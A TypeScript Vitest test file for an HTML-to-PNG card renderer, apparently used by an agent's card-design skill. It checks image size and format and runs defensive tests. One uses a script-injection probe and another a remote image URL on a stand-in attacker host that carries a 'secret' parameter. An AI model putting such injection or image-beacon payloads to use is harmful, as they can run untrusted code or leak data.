import { readFile } from "node:fs/promises";
import { describe, expect, it } from "vitest";
import { sniffBrowserImageMediaType } from "@shared/browser/artifact";
import { renderVisual } from "./render";

function pngSize(bytes: Uint8Array) {
  const view = new DataView(bytes.buffer, bytes.byteOffset);
  return { height: view.getUint32(20), width: view.getUint32(16) };
}

describe("renderVisual", () => {
  it("draws house-style HTML as a PNG sized to its content", async () => {
    const bytes = await renderVisual(
      `<div class="card"><div class="spread"><div class="row"><div class="badge">1</div><div class="title">French bee</div></div><div class="price">$1,419</div></div><div class="muted">Sat 14 Nov · Nonstop</div></div>`
    );

    expect(sniffBrowserImageMediaType(bytes)).toBe("image/png");
    const { height, width } = pngSize(bytes);
    expect(width).toBe(780);
    expect(height).toBeGreaterThan(100);
    expect(height).toBeLessThan(400);
  });

  it("draws the card-design skill's example as one phone-sized image", async () => {
    const skill = await readFile("agent/skills/card-design/SKILL.md", "utf8");
    const example = /```html\n(?<html>[\s\S]*?)```/u.exec(skill)?.groups?.html;
    if (!example) throw new Error("The skill has no HTML example.");

    const { height, width } = pngSize(await renderVisual(example));

    expect(width).toBe(780);
    expect(height).toBeLessThan(1_100);
  });

  it("ignores scripts and styles", async () => {
    const bytes = await renderVisual(
      `<div class="card"><script>alert(1)</script><style>div{}</style><div>Hi</div></div>`
    );

    expect(sniffBrowserImageMediaType(bytes)).toBe("image/png");
  });

  it("refuses remote images", async () => {
    await expect(
      renderVisual(
        `<div class="card"><img src="https://attacker.test/pixel.png?secret=1" width="10" height="10" /></div>`
      )
    ).rejects.toThrow("remote image URLs are not allowed");
  });

  it("refuses images taller than one card", async () => {
    const rows = Array.from(
      { length: 80 },
      (_, index) => `<div class="title">Row ${String(index)}</div>`
    ).join("");

    await expect(
      renderVisual(`<div class="card">${rows}</div>`)
    ).rejects.toThrow("by showing less");
  });
});
